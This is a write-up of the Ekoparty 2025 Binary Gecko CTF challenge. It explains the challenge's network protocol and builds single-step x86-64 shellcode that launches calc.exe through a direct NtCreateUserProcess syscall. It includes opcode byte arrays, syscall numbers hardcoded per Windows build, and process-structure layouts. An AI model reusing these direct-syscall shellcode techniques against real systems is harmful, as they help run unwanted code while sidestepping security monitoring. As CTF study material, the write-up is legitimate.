# ekoparty_2025_ctf
Writeup for the Binary Gecko's Ekoparty CTf 2025 - https://github.com/Binary-Gecko/ekoparty2025_challenge

Binary Gecko presents an interesting challenge here, you can execute any code you want, but it only occurs one instruction at a time.
That means any code we write is going to have to work without function calls which means we're going to write a direct syscall, fortunately we don't have to worry about any EDR.
(Although Windows Defender hates the binary statically so make sure to give yourself an exemption.)

The first step is to connect to the network port it exposes :20259
```
iVar2 = SocketCreation(s_0.0.0.0_14000d560,20259,local_210);
```

Then we will need to send the expected cookie:
```
strcmp(param_2,s_Ekoparty_2025_-_Binary_Gecko_cha_14000d040);

"Ekoparty 2025 - Binary Gecko challenge"
```

Now we can send our instructions, first the size, little endian.

```
    length_of_instruction_length = recv(communication_socket,(char *)&instruction_length,4,0);
    if (length_of_instruction_length == -1) {
      return;
    }
    if (length_of_instruction_length != 4) {
      return;
    }
    printf(s_[+]_Instruction_size:_%i_14000d470,(ulonglong)instruction_length);
    if (0x1000 < instruction_length) {
      printf(s_[-]_Instruction_size_too_long_14000d490);
      return;
    }
```

Then the instruction itself, which will be injected directly into the "virtual" CPU:

```
    length_of_instruction_length = recv(communication_socket,asm_for_remote,instruction_length,0);
    if ((length_of_instruction_length == 0xffffffff) ||
       (length_of_instruction_length != instruction_length)) break;
    printf(s_[+]_Instruction_received:_%i_byt_14000d4d8,(ulonglong)length_of_instruction_length);
    uVar2 = Interact_with_remote_thread
                      (0,*(DWORD *)(Remote_Proccess_Pointer + 2),(HANDLE)*Remote_Proccess_Pointer,
                       (HANDLE)Remote_Proccess_Pointer[1],Remote_memory_location,instruction_length,
                       asm_for_remote);
    local_1010 = (int)uVar2;
    if (local_1010 == 0) {
      return;
    }
```

While you can send instructions upto 4096 bytes, the "virtual" cpu (Really just a remote thread in debug mode) is being single stepped.
This means only the first instruction length will be executed, and the next instruction sent will overwrtite your previous instructions.

Fortunately, as long as we don't cause a crash with out instructions, our stack remains stable, and we can save registers however we like.

So what do we need? Some equivalent to this https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa which will eventually make the syscall.
If we debug a simple program that opens calc we can follow from CreateProccessA through to the ntdll.dll syscall stub.

If we compare the raw values on the stack and in the first for argument registers we end up with something like:

```
https://ntdoc.m417z.com/ntcreateprocess
NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle, - RCX - Pointer to 0000 bytes
    _Out_ PHANDLE ThreadHandle, - RDX - Pointer to 0000 bytes
    _In_ ACCESS_MASK ProcessDesiredAccess, - RD8 - mov rd8, eax {0x2000000}
    _In_ ACCESS_MASK ThreadDesiredAccess, - RD9 - mov rd9, eax {0x2000000}
    _In_opt_ PCOBJECT_ATTRIBUTES ProcessObjectAttributes, - RSP+0x20 = null = 00000000`00000000
    _In_opt_ PCOBJECT_ATTRIBUTES ThreadObjectAttributes, - 0x28 = null = 00000000`00000000 - raw value?
    _In_ ULONG ProcessFlags, // PROCESS_CREATE_FLAGS_* - 0x30 = 00007ffd`00000200 (actually just the lower half here, [0x200]) - raw value
    _In_ ULONG ThreadFlags, // THREAD_CREATE_FLAGS_* - 0x38 = 00000000`00000001 - Raw value
    _In_opt_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters, - 0x40 = 000001fd`79223370 - RSI string ptr none = 08 07 00 00 08 07 00 00 https://ntdoc.m417z.com/rtl_user_process_parameters
    _Inout_ PPS_CREATE_INFO CreateInfo, - 0x48 = 0000002f`858fe070 ptr to > 00000000`00000058 00000000`00000000 https://ntdoc.m417z.com/ps_create_info
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList - 0x50 = 0000002f`858fe4a0 ptr to > 00000000`000000a8 https://ntdoc.m417z.com/ps_attribute_list
    );
```

Most of this is null or a simple flag value, which is great, thats easy enough to setup, but there are a couple of structures that will have to be full created.
Notably PRTL_USER_PROCESS_PARAMETERS is an absolutely hugeone one to try and recreate with lots of sub structures, so I did some testing.
If you simply steal an existing one from the current proccess, calc will still launch, because calc.exe spawns a calc "application" in windows 10/11 but notepad will crash (I suspect because its trying to write to the same console handler)

That means we only have to create a PPS_CREATE_INFO and PPS_ATTRIBUTE_LIST structure.
Digging into both of these structures, they are again mostly nulled out or masked, even though PPS_CREATE_INFO has loads of sub structures, most of it is null except one mask.
We can create it like so:
```
create_info_asm = [b'\x48\x31\xC9', #xor rcx,rcx 
b'\x48\xB8\x58\x00\x00\x00\x00\x00\x00\x00', #movabs rax, 0x00058 (Size of Create_INFO)
b'\x48\xBA\x03\x00\x00\x20\x81\x00\x00\x00', #movabs rdx, 0x0000008120000003 (CreateInitialState Struct)
b'\x48\x89\x04\x24', #mov [rsp], rax
b'\x48\x89\x4C\x24\x08', #mov [rsp+0x8], rcx
b'\x48\x89\x54\x24\x10', #mov [rsp+0x10], rdx
b'\x48\x89\x4C\x24\x18', #mov [rsp+0x18], rcx
b'\x48\x89\x4C\x24\x20', #mov [rsp+0x20], rcx
b'\x48\x89\x4C\x24\x28', #mov [rsp+0x28], rcx
b'\x48\x89\x4C\x24\x30', #mov [rsp+0x30], rcx
b'\x48\x89\x4C\x24\x38', #mov [rsp+0x38], rcx
b'\x48\x89\x4C\x24\x48', #mov [rsp+0x48], rcx
b'\x48\x89\x4C\x24\x50', #mov [rsp+0x50], rcx
b'\x48\x89\x4C\x24\x58', #mov [rsp+0x58], rcx
b'\x48\x83\xC4\x60'] #add rsp,0x60 (Skip over the object for future structures)
```

The attribute structure requires a few pointers to other structures, even though they're null.
The structure looks like:
Size_of_struct, {OBJTYPE/AttributesMask, SizeOfAttribute, AttributePTR, NULL)*n
The minimum we need is PsAttributeImageName (exe disk location string), PsAttributeClientId (null), PsAttributeImageInfo (null), PsAttributeStdHandleInfo (null), PsAttributeChpe (null)
```
Atribute list:

00000000`000000a8 <- size 
00000000`00020005 00000000`00000040 00000250`7e893980 00000000`00000000 ImageName, size 40, pointer to \??\calc ...
00000000`00010003 00000000`00000010 000000b0`44cfe840 00000000`00000000 output, Pointer to Client ID, null
00000000`00000006 00000000`00000040 000000b0`44cfe980 00000000`00000000 output, pointer to img info, null
00000000`0002000a 00000000`00000008 000000b0`44cfe5b0 00000000`00000000 -> ptr to 00000003`7e89a301 00000000`00000000 00000000`7e89a590 000000b0`00000000 can be nulled confirmed.
00000000`0006001a 00000000`00000001 00000000`00000001 00000000`00000000
```


Given most of these options are null with pointers I created the objects in memory and then the calc string using the following code:

```
client_id_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big")
image_info_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big") + 0x10
stdhandle_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big") + 0x50
image_name_ptr = int.from_bytes(binascii.unhexlify(remote_registers[b'RSP']),byteorder="big") + 0x58

attributes_objects_asm = [b'\x48\x31\xC9',
b'\x48\x89\x0C\x24',
b'\x48\x89\x4C\x24\x08',
b'\x48\x89\x4C\x24\x10',
b'\x48\x89\x4C\x24\x18',
b'\x48\x89\x4C\x24\x20',
b'\x48\x89\x4C\x24\x28',
b'\x48\x89\x4C\x24\x30',
b'\x48\x89\x4C\x24\x38',
b'\x48\x89\x4C\x24\x40',
b'\x48\x89\x4C\x24\x48',
b'\x48\x89\x4C\x24\x50',
b'\x48\x83\xC4\x58']


calc_string = [b'005c003f003f005c',b'0057005c003a0043',
b'006f0064006e0069', b'0073005c00730077',
b'0065007400730079', b'005c00320033006d',
b'0063006c00610063', b'006500780065002e']

for calculator in calc_string:
  attributes_objects_asm.append(b'\x48\xB9' + prep_qword_asm(int.from_bytes(binascii.unhexlify(calculator),byteorder="big")))
  attributes_objects_asm.append(b'\x48\x89\x0C\x24')
  attributes_objects_asm.append(b'\x48\x83\xC4\x08')
```
This allows easy creation of any potential string by stealing it from our debug sessions, but there are otherways to create it as well.
Notably it expects a UTF8 string, hence there are lots of null bytes.
I also simplified the instructions to punch each line in then RSP+8 to avoid not knowing beforehand how long the string would be.

This gives us everything we need for our shellcode, however because NTDLL is unloaded, we don't have a way to know the exact syscall to expect using a LDR Module walk, however we can hardcode them by checking the value of OSBuildNumber at peb+0x120 the following structure is to handle all win10/11 options (and some server ones)
```
syscall_options = {b'0000000000002800':b'\xba', b'000000000000295a':b'\xbb', b'0000000000003839':b'\xbd', b'0000000000003ad7':b'\xc0', b'0000000000003fab':b'\xc1', b'00000000000042ee':b'\xc2', b'0000000000004563':b'\xc3', b'00000000000047ba':b'\xc4', b'00000000000047bb':b'\xc4', b'0000000000004a61':b'\xc8', b'0000000000004a62':b'\xc8', b'0000000000004a63':b'\xc8', b'0000000000004a64':b'\xc9', b'0000000000004a65':b'\xc9', b'0000000000004f7c':b'\xcd', b'00000000000055f0':b'\xce', b'000000000000585d':b'\xcf', b'0000000000005867':b'\xcf', b'0000000000006336':b'\xd0', b'00000000000065f4':b'\xd1', b'00000000000065f4':b'\xd1', b'0000000000006658':b'\xd1'}
```

Once's thats all in place, we can use the following assembly to prepare our structure.
There are a couple quirks about this, because a regular syscall would happen from a function call intially, we need to prepare our alignment and the offsets of the values of our arguments will be 0x8 offset what is shown in a debugger before calling the ntdll function.
```
prep_syscall_asm = [b'\x48\xB9' + prep_qword_asm(int.from_bytes(binascii.unhexlify(atribute_list_ptr),byteorder="big")), #rsp +0x58
b'\x48\xBA' + prep_qword_asm(int.from_bytes(binascii.unhexlify(create_info_ptr),byteorder="big")), #rsp +0x58 
b'\x49\xB9' + prep_qword_asm(int.from_bytes(binascii.unhexlify(process_params_ptr),byteorder="big")), #\x00\x30\x22\x79\xFD\x01\x00\x00 
b'\x48\x89\x4C\x24\x58', #mov    QWORD PTR [rsp+0x58],rcx
b'\x48\x89\x54\x24\x50', #mov    QWORD PTR [rsp+0x50],rdx
b'\x4C\x89\x4C\x24\x48', #mov    QWORD PTR [rsp+0x48],raf9
b'\x48\x31\xC9', #xor rcx,rcx
b'\x48\x89\x4C\x24\x60', #mov    QWORD PTR [rsp+0x60],rcx
b'\x48\x89\x4C\x24\x68', #mov    QWORD PTR [rsp+0x68],rcx
b'\x48\x89\x4C\x24\x30', #mov    QWORD PTR [rsp+0x30],rcx 
b'\x48\x89\x4C\x24\x28', #mov    QWORD PTR [rsp+0x28],rcx 
#b'\x48\xFF\xC1', #inc    rcx 
b'\x48\x89\x4C\x24\x40', #mov    QWORD PTR [rsp+0x40],rcx
b'\x48\x81\xC1\x00\x02\x00\x00', #add    rcx,0x200
b'\x48\x89\x4C\x24\x38', #mov    QWORD PTR [rsp+0x38],rcx
b'\xB8\x00\x00\x00\x02', #mov    eax,0x2000000
b'\x44\x8B\xC8', #mov    r9d,eax 41 89 c1  
b'\x44\x8B\xC0', #mov    r8d,eax 41 89 c0 
b'\x48\x8D\x54\x24\x60', #lea    rdx,[rsp+0x60]
b'\x48\x8D\x4C\x24\x68', #lea    rcx,[rsp+0x68]
syscall_eax,#, #mov    eax,0xc9 Might need to get syscall from ntdll
b'\x4C\x8B\xD1' #MOV r10,rcx
]
```

Bonus/Easter Eggs.

I absolutely messed up at the start with two rabbitholes.
1. I handcrafted all this assembly and messed up the mov rcx, gs:[0x30] call as mov rcx, [gs+0x30] which is gauranteed null memory almost, and I created a teb/peb bruteforcer in memory.
This is commented out now but you can enjoy that if you want a laugh or need it for some reason, it was good fun creating the teb/peb heuristic egghunter.


2. I overthought how to find the right syscall, and was desperately trying to find ntdll in memory.
I paused the initial challenge program and attached a debugger to the subprogram before the challenge program did to test ntdll walking.
The only problem is that this populates several dlls which otherwise aren't (Thanks windbg!) and shows a memory region that under normal functionality isn't accessible. 
This lead to me creating a VirtualProtect syscall as well (also commented out) becuase this syscall is stable across all win10/11 versions. Unfortunately, when you run the challenge properly, the LDR peb[0x018] value is empty negating the point of this.


Additionall References:
 https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html 
 https://ntdoc.m417z.com
 https://github.com/Microwave89/createuserprocess
 https://github.com/peta909/NtCreateUserProcess_
 https://github.com/PorLaCola25/PPID-Spoofing
